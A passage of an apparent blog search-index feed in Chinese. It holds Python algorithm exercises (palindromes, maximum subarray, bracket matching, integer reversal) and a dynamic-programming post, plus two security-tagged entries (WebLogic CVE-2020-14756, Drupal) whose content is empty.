class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(n)</code></li><li>空间复杂度<code>O(1)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>利用int()，可以将数字字符串转为数字</li><li>利用bin()方法，将数字转为二进制字符串</li></ol><h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><h3 id="二进制减法"><a href="#二进制减法" class="headerlink" title="二进制减法"></a>二进制减法</h3><h3 id="二进制乘法"><a href="#二进制乘法" class="headerlink" title="二进制乘法"></a>二进制乘法</h3><h3 id="二进制除法"><a href="#二进制除法" class="headerlink" title="二进制除法"></a>二进制除法</h3>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day15</title>
      <link href="//code/python/pythontip-100days-day15/"/>
      <url>//code/python/pythontip-100days-day15/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>判断一个整数是否为回文数。回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="line-numbers language-none"><code class="language-none">isPalindrome(1) -&gt; TrueisPalindrome(121) -&gt; TrueisPalindrome(-121) -&gt; False<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ol><li>输入为整数</li></ol><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>你能想到不将整数转换为字符串的方法吗</li><li>利用除法和取模运算</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">isPalindrome</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> x<span class="token operator">&lt;</span><span class="token number">0</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>x<span class="token operator">%</span><span class="token number">10</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> x <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    origin <span class="token operator">=</span> x    revertedNumber <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> x <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>        revertedNumber <span class="token operator">=</span> revertedNumber<span class="token operator">*</span><span class="token number">10</span> <span class="token operator">+</span> x<span class="token operator">%</span><span class="token number">10</span>        x <span class="token operator">//=</span> <span class="token number">10</span>    <span class="token keyword">return</span> origin <span class="token operator">==</span> revertedNumber   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>性能</strong>：</p><ol><li>时间复杂度<code>O(logn)</code></li><li>空间复杂度<code>O(1)</code></li></ol><p><strong>关键点</strong>：</p><ol><li>利用除法和取模运算</li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法——动态规划</title>
      <link href="//blogs/suan-fa-dong-tai-gui-hua/"/>
      <url>//blogs/suan-fa-dong-tai-gui-hua/</url>
      
        <content type="html"><![CDATA[<p>动态规划核心思想：记住已经解决过的子问题的解。</p><h3 id="动态规划的两种形式"><a href="#动态规划的两种形式" class="headerlink" title="动态规划的两种形式"></a>动态规划的两种形式</h3><ol><li>自顶向下的备忘录</li><li>自底向上</li></ol><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="Fibonnacci"><a href="#Fibonnacci" class="headerlink" title="Fibonnacci"></a>Fibonnacci</h4><p>使用动态规划思想实现斐波拉契数列<code>Fibonacci</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""使用动态规划思想实现斐波拉契数列"""</span><span class="token keyword">def</span> <span class="token function">fibonacci</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> n <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> n    memo <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> n    <span class="token keyword">return</span> fib<span class="token punctuation">(</span>n<span class="token punctuation">,</span> memo<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">fib</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> memo<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> memo<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> memo<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> n <span class="token operator">&lt;=</span> <span class="token number">2</span><span class="token punctuation">:</span>        memo<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        memo<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> fib<span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> memo<span class="token punctuation">)</span> <span class="token operator">+</span> fib<span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> memo<span class="token punctuation">)</span>    <span class="token keyword">return</span> memo<span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="钢条切割问题"><a href="#钢条切割问题" class="headerlink" title="钢条切割问题"></a>钢条切割问题</h4><p>Serling公司购买长钢条，将其切割为短钢条出售。切割工序本身没有成本支出。公司管理层希望知道最佳的切割方案。假定我们知道Serling公司出售一段长为i英寸的钢条的价格为p<del>i</del>(i=1,2,…，单位为美元)。钢条的长度均为整英寸。图15-1给出了一个价格表的样例。</p><img src="/blogs/suan-fa-dong-tai-gui-hua/162025012825029.png" class="" title="img"><p>钢条切割问题是这样的：给定一段长度为n英寸的钢条和一个价格表p<del>i</del>(i=1,2,…n)，求切割钢条方案，使得销售收益r<del>n</del>最大。注意，如果长度为n英寸的钢条的价格p<del>n</del>足够大，最优解可能就是完全不需要切割。</p>]]></content>
      
      
      <categories>
          
          <category> blogs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 动态规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Weblogic Server远程代码执行漏洞（CVE-2020-14756）</title>
      <link href="//blogs/weblogic-server-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2020-14756/"/>
      <url>//blogs/weblogic-server-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2020-14756/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> blogs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2020-14756 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day14</title>
      <link href="//code/python/pythontip-100days-day14/"/>
      <url>//code/python/pythontip-100days-day14/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个整数数组 <code>nums</code> ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><ul><li>[-2,1,-3,4,-1,2,1,-5,4] -&gt; 6</li></ul><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ul><li>输入的数组元素为整数</li></ul><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>枚举所有子数组，检查每个子数组和</li><li>你能想到更优的解法吗？(利用动态规划思想)</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1:"></a>解法1:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">maxSubArray</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">:</span>    max_ <span class="token operator">=</span> nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            sub_sum <span class="token operator">=</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">:</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> sub_sum <span class="token operator">&gt;</span> max_<span class="token punctuation">:</span>                max_ <span class="token operator">=</span> sub_sum    <span class="token keyword">return</span> max_                                                                            <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="性能"><a href="#性能" class="headerlink" title="性能"></a>性能</h3><ol><li>时间复杂度O(n^3)</li><li>空间复杂度O(1)</li></ol><h3 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h3><ol><li>枚举所有子数组并计算和</li></ol><h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2:"></a>解法2:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">maxSubArray</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    max_ <span class="token operator">=</span> tmp    n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 当当前序列加上此时的元素的值大于tmp的值，说明最大序列和可能出现在后续序列中，记录此时的最大值</span>        <span class="token keyword">if</span> tmp <span class="token operator">+</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&gt;</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>            max_ <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span>max_<span class="token punctuation">,</span> tmp<span class="token operator">+</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            tmp <span class="token operator">=</span> tmp <span class="token operator">+</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token comment">#当tmp(当前和)小于下一个元素时，当前最长序列到此为止。以该元素为起点继续找最大子序列,</span>        <span class="token comment"># 并记录此时的最大值</span>            max_ <span class="token operator">=</span> <span class="token builtin">max</span><span class="token punctuation">(</span>max_<span class="token punctuation">,</span> tmp<span class="token punctuation">,</span> tmp<span class="token operator">+</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            tmp <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> max_                                                                          <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="性能-1"><a href="#性能-1" class="headerlink" title="性能"></a>性能</h3><ol><li>时间复杂度O(n)</li><li>空间复杂度O(1)</li></ol><h3 id="关键点-1"><a href="#关键点-1" class="headerlink" title="关键点"></a>关键点</h3><ol><li>动态规划</li></ol>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>drupal相关漏洞</title>
      <link href="//blogs/drupal-xiang-guan-lou-dong/"/>
      <url>//blogs/drupal-xiang-guan-lou-dong/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> blogs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day13</title>
      <link href="//code/python/pythontip-100days-day13/"/>
      <url>//code/python/pythontip-100days-day13/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个只包括 ‘(‘，’)’，’{‘，’}’，’[‘，’]’ 的字符串，判断字符串是否有效。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><ul><li><code>()</code> -&gt; true</li><li><code>(]</code> -&gt; false</li><li><code>([)]</code> -&gt; false</li><li><code>[](){}</code> -&gt; True</li><li><code>[{}]()</code>-&gt; True</li></ul><h2 id="假设"><a href="#假设" class="headerlink" title="假设"></a>假设</h2><ul><li>输入的字符串仅包含’(‘，’)’，’{‘，’}’，’[‘，’]’这些字符</li></ul><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>利用栈这一数据结构</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法"><a href="#解法" class="headerlink" title="解法:"></a>解法:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">isValid</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>            pairs <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">")"</span><span class="token punctuation">:</span> <span class="token string">"("</span><span class="token punctuation">,</span>        <span class="token string">"]"</span><span class="token punctuation">:</span> <span class="token string">"["</span><span class="token punctuation">,</span>        <span class="token string">"}"</span><span class="token punctuation">:</span> <span class="token string">"{"</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span>    stack <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> ch <span class="token keyword">in</span> s<span class="token punctuation">:</span>        <span class="token keyword">if</span> ch <span class="token keyword">in</span> pairs<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> stack <span class="token keyword">or</span> stack<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> pairs<span class="token punctuation">[</span>ch<span class="token punctuation">]</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">False</span>            stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ch<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token keyword">not</span> stack                                                                   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="性能"><a href="#性能" class="headerlink" title="性能"></a>性能</h3><ol><li>时间复杂度O(n)</li><li>空间复杂度O(n)</li></ol><h3 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h3><ol><li>利用栈这一数据结构</li></ol><h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> prettytable<span class="token keyword">class</span> <span class="token class-name">StackException</span><span class="token punctuation">(</span>Exception<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>__msg <span class="token operator">=</span> msg    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>__msg<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Stack</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> __len<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>__date <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment"># 存储栈数据</span>        self<span class="token punctuation">.</span>__size <span class="token operator">=</span> <span class="token number">10</span>  <span class="token comment"># 初始栈的长度</span>        self<span class="token punctuation">.</span>__len <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 记录栈中数据的数量</span>    <span class="token keyword">def</span> <span class="token function">push</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        向栈顶压入数据        :param value:        :return: 是否压入成功 True|False        """</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>isFull<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment"># 表示栈还没有满，可以添加数据</span>            self<span class="token punctuation">.</span>__date<span class="token punctuation">.</span>append<span class="token punctuation">(</span>value<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>__len <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">raise</span> StackException<span class="token punctuation">(</span><span class="token string">'栈已经满了，不能添加数据！'</span><span class="token punctuation">)</span>            <span class="token keyword">finally</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">pop</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        返回并删除栈顶数据        :return:        """</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>isEmpty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>__len <span class="token operator">-=</span> <span class="token number">1</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>__date<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">raise</span> StackException<span class="token punctuation">(</span><span class="token string">'栈为空，没有数据可以返回'</span><span class="token punctuation">)</span>            <span class="token keyword">finally</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">None</span>    <span class="token keyword">def</span> <span class="token function">top</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        返回栈元素        :return:        """</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>isEmpty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>__date<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">raise</span> StackException<span class="token punctuation">(</span><span class="token string">'栈为空，没有数据可以返回'</span><span class="token punctuation">)</span>            <span class="token keyword">finally</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">None</span>    <span class="token keyword">def</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        判断栈是否为空        :return: bool True|False        """</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>__len <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">isFull</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        判断栈是否为满        :return: bool True|False        """</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>__len <span class="token operator">==</span> self<span class="token punctuation">.</span>__size<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">def</span> <span class="token function">__size</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        返回栈中的容量        :return:        """</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>__len    <span class="token keyword">def</span> <span class="token function">__length</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        返回栈中数据的数量        :return:        """</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>__size    <span class="token keyword">def</span> <span class="token function">__len__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        可以使用len()方法查看栈的长度        :return:        """</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>__len    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        使用print()方法打印栈        使用prettytable打印成表格形式        :return:        """</span>        sta <span class="token operator">=</span> prettytable<span class="token punctuation">.</span>PrettyTable<span class="token punctuation">(</span><span class="token punctuation">)</span>        sta<span class="token punctuation">.</span>field_names <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'栈顶'</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>__len<span class="token punctuation">)</span><span class="token punctuation">:</span>            sta<span class="token punctuation">.</span>add_row<span class="token punctuation">(</span>self<span class="token punctuation">.</span>__date<span class="token punctuation">[</span><span class="token operator">-</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> sta<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用栈实现</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">isValid</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    判断括号是否匹配    :param s:    :return:    """</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    pairs <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">')'</span><span class="token punctuation">:</span> <span class="token string">'('</span><span class="token punctuation">,</span>             <span class="token string">'}'</span><span class="token punctuation">:</span> <span class="token string">'{'</span><span class="token punctuation">,</span>             <span class="token string">']'</span><span class="token punctuation">:</span> <span class="token string">'['</span><span class="token punctuation">}</span>    stack <span class="token operator">=</span> Stack<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> s<span class="token punctuation">:</span>        <span class="token keyword">if</span> item <span class="token keyword">in</span> pairs <span class="token keyword">and</span> stack<span class="token punctuation">.</span>top<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> pairs<span class="token punctuation">.</span>get<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">:</span>            stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            stack<span class="token punctuation">.</span>push<span class="token punctuation">(</span>item<span class="token punctuation">)</span>    <span class="token keyword">return</span> stack<span class="token punctuation">.</span>isEmpty<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> python days100 </tag>
            
            <tag> pythontip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythontip 100days-day12</title>
      <link href="//code/python/pythontip-100days-day12/"/>
      <url>//code/python/pythontip-100days-day12/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给出一个 32 位的有符号整数，将这个整数中每位上的数字进行反转</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><ul><li>123 -&gt; 321</li><li>-123 -&gt; -321</li><li>120 -&gt; 21</li><li>0 -&gt; 0</li></ul><p><strong>假设</strong></p><ul><li>输入的整数范围位于<code>-2^31</code>到<code>2^31-1</code>范围内</li></ul><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>将整数转化为字符串进后进行处理</li><li>不借助字符串，仅利用除法，取模操作完成</li></ol><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1:"></a>解法1:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">reverse</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token operator">-</span><span class="token number">10</span> <span class="token operator">&lt;</span> x <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> x    str_x <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">if</span> str_x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">"-"</span><span class="token punctuation">:</span>        str_x <span class="token operator">=</span> str_x<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token 